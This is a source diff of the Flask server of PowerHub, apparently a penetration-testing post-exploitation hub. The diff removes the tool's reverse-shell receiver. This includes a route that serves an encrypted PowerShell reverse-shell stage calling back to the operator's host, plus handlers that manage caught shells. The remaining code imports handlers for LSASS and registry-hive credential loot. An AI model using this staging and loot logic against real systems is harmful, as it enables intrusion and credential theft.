@@ -8,7 +8,7 @@ import shutil
 from tempfile import TemporaryDirectory
 
 from flask import Flask, render_template, request, Response, redirect, \
-         send_from_directory, flash, make_response, abort, jsonify
+         send_from_directory, flash, abort, jsonify
 
 from werkzeug.exceptions import BadRequestKeyError
 from werkzeug.serving import WSGIRequestHandler, _log
@@ -26,7 +26,6 @@ from powerhub.tools import encrypt, compress, KEY
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
-from powerhub.receiver import ShellReceiver
 from powerhub.loot import save_loot, get_lsass_goodies, get_hive_goodies, \
         parse_sysinfo
 from powerhub.args import args
@@ -76,7 +75,6 @@ def push_notification(type, msg, title, subtitle="", **kwargs):
                   namespace="/push-notifications")
 
 
-shell_receiver = ShellReceiver(push_notification=push_notification)
 
 
 class MyRequestHandler(WSGIRequestHandler):
@@ -152,18 +150,6 @@ def hub():
         "VERSION": __version__,
     }
     return render_template("hub.html", **context)
-
-
-@app.route('/receiver')
-@requires_auth
-def receiver():
-    context = {
-        "SSL": args.SSL_KEY is not None,
-        "shells": shell_receiver.active_shells(),
-        "AUTH": args.AUTH,
-        "VERSION": __version__,
-    }
-    return render_template("receiver.html", **context)
 
 
 @app.route('/loot')
@@ -443,9 +429,11 @@ def upload():
 def download_file(filename):
     """Download a file"""
     try:
-        return send_from_directory(UPLOAD_DIR,
-                                   filename,
-                                   as_attachment=True)
+        return send_from_directory(
+            UPLOAD_DIR,
+            filename,
+            as_attachment='dl' in request.args,
+        )
     except PermissionError:
         abort(403)
 
@@ -491,80 +479,6 @@ def reload_modules():
     return render_template("messages.html")
 
 
-@app.route('/r', methods=["GET"])
-def payload_r():
-    """Load next stage of the Reverse Shell"""
-    context = {
-        "IP": args.URI_HOST,
-        "delay": 10,  # delay in seconds
-        "lifetime": 3,  # lifetime in days
-        "PORT": str(args.REC_PORT),
-        "key": KEY,
-        "callback_url": callback_urls[request.args['t']],
-        "transport": request.args["t"],
-        "symbol_name": symbol_name,
-    }
-    result = render_template(
-                    "powershell/reverse-shell.ps1",
-                    **context,
-    ).encode()
-    result = b64encode(encrypt(result, KEY))
-    return Response(result, content_type='text/plain; charset=utf-8')
-
-
-@app.route('/shell-log', methods=["GET"])
-def shell_log():
-    shell_id = request.args['id']
-    if 'content' in request.args:
-        content = request.args['content']
-    else:
-        content = 'html'
-    shell = shell_receiver.get_shell_by_id(shell_id)
-    log = shell.get_log()
-    context = {
-        'log': log,
-        'content': content,
-    }
-    if content == 'html':
-        return render_template("receiver/shell-log.html", **context)
-    elif content == 'raw':
-        response = make_response(render_template("receiver/shell-log.html",
-                                 **context))
-        response.headers['Content-Disposition'] = \
-            'attachment; filename=' + shell_id + ".log"
-        response.headers['content-type'] = 'text/plain; charset=utf-8'
-        return response
-
-
-@app.route('/kill-shell', methods=["POST"])
-def shell_kill():
-    shell_id = request.form.get("shellid")
-    shell = shell_receiver.get_shell_by_id(shell_id)
-    shell.kill()
-    return ""
-
-
-@app.route('/forget-shell', methods=["POST"])
-def shell_forget():
-    shell_id = request.form.get("shellid")
-    shell_receiver.forget_shell(shell_id)
-    return ""
-
-
-@app.route('/kill-all', methods=["POST"])
-def shell_kill_all():
-    for shell in shell_receiver.active_shells():
-        shell.kill()
-    return ""
-
-
-@app.route('/receiver/shellcard', methods=["GET"])
-def shell_card():
-    shell_id = request.args["shell-id"]
-    shell = shell_receiver.get_shell_by_id(shell_id)
-    return render_template("receiver/receiver-shellcard.html", s=shell)
-
-
 @socketio.on('connect', namespace="/push-notifications")
 def test_connect():
     log.debug("Websockt client connected")
@@ -575,6 +489,6 @@ def server_static(filename):
     try:
         return send_from_directory(STATIC_DIR,
                                    filename,
-                                   as_attachment=True)
+                                   as_attachment=False)
     except PermissionError:
         abort(403)
